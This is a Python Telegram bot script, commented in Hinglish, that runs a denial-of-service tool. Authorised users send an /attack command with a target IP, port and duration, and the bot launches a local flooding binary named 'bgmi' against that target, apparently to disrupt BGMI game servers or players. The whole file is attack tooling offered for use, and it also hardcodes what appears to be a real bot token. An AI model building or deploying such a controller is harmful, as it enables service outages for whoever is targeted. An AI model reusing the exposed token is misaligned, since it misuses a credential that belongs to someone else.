#!/usr/bin/env python3
import subprocess
import os
import json
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ========== SETTINGS ==========
TOKEN = "8538094058:AAEGHcVfXOB4ERkrGNsISm85Oz_qZH6Jibc"
BINARY = "./bgmi"
ADMIN_ID = 7518035096                    # Tera Telegram ID (Owner)
USERS_FILE = "users.json"               # Allowed users list file
# ==============================

logging.basicConfig(level=logging.INFO)

# ===== USER MANAGEMENT FUNCTIONS =====
def load_users():
    """JSON file se allowed users load karega"""
    try:
        with open(USERS_FILE, 'r') as f:
            data = json.load(f)
            return data.get('users', [ADMIN_ID])
    except:
        # Pehli baar run - sirf admin allowed
        save_users([ADMIN_ID])
        return [ADMIN_ID]

def save_users(users_list):
    """Users list ko JSON file me save karega"""
    with open(USERS_FILE, 'w') as f:
        json.dump({'users': users_list}, f)

# ===== SECURITY CHECK =====
def restricted(func):
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        allowed = load_users()
        if user_id not in allowed:
            await update.message.reply_text("🚫 Tu allowed nahi hai. Admin se contact kar.")
            return
        return await func(update, context)
    return wrapped

def admin_only(func):
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id != ADMIN_ID:
            await update.message.reply_text("🚫 Sirf Admin yeh command use kar sakta hai.")
            return
        return await func(update, context)
    return wrapped

# ===== BASIC COMMANDS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 **BGMI BOT READY** 🔥\n\n"
        "/attack <IP> <PORT> <TIME> - Attack chalu kare\n"
        "/users - Allowed users ki list dekhe\n\n"
        "**Admin Commands:**\n"
        "/add <USER_ID> - Naya user add kare\n"
        "/del <USER_ID> - User remove kare",
        parse_mode='Markdown'
    )

@restricted
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    parts = update.message.text.split()
    if len(parts) != 4:
        await update.message.reply_text("❌ Usage: /attack <IP> <PORT> <TIME>")
        return
    
    ip, port, time = parts[1], parts[2], parts[3]
    
    try:
        subprocess.Popen([BINARY, ip, port, time])
        await update.message.reply_text(f"✅ **ATTACK CHALU**\n🎯 `{ip}:{port}`\n⏱️ `{time}s`", parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

@restricted
async def users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    allowed = load_users()
    msg = "👥 **ALLOWED USERS:**\n"
    for uid in allowed:
        if uid == ADMIN_ID:
            msg += f"• `{uid}` 👑 Admin\n"
        else:
            msg += f"• `{uid}`\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

# ===== ADMIN COMMANDS =====
@admin_only
async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    parts = update.message.text.split()
    if len(parts) != 2:
        await update.message.reply_text("❌ Usage: /add <USER_ID>")
        return
    
    try:
        new_id = int(parts[1])
    except:
        await update.message.reply_text("❌ USER_ID number hona chahiye")
        return
    
    allowed = load_users()
    if new_id in allowed:
        await update.message.reply_text(f"⚠️ User `{new_id}` pehle se allowed hai", parse_mode='Markdown')
        return
    
    allowed.append(new_id)
    save_users(allowed)
    await update.message.reply_text(f"✅ User `{new_id}` add kar diya gaya", parse_mode='Markdown')

@admin_only
async def del_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    parts = update.message.text.split()
    if len(parts) != 2:
        await update.message.reply_text("❌ Usage: /del <USER_ID>")
        return
    
    try:
        del_id = int(parts[1])
    except:
        await update.message.reply_text("❌ USER_ID number hona chahiye")
        return
    
    if del_id == ADMIN_ID:
        await update.message.reply_text("🚫 Admin ko remove nahi kar sakte")
        return
    
    allowed = load_users()
    if del_id not in allowed:
        await update.message.reply_text(f"⚠️ User `{del_id}` allowed list me nahi hai", parse_mode='Markdown')
        return
    
    allowed.remove(del_id)
    save_users(allowed)
    await update.message.reply_text(f"✅ User `{del_id}` remove kar diya gaya", parse_mode='Markdown')

# ===== MAIN =====
def main():
    # Pehli baar run pe users.json create hoga
    load_users()
    
    app = Application.builder().token(TOKEN).build()
    
    # Basic Commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("users", users_list))
    
    # Admin Commands
    app.add_handler(CommandHandler("add", add_user))
    app.add_handler(CommandHandler("del", del_user))
    
    print(f"🤖 Bot started. Admin ID: {ADMIN_ID}")
    app.run_polling()

if __name__ == "__main__":
    main()
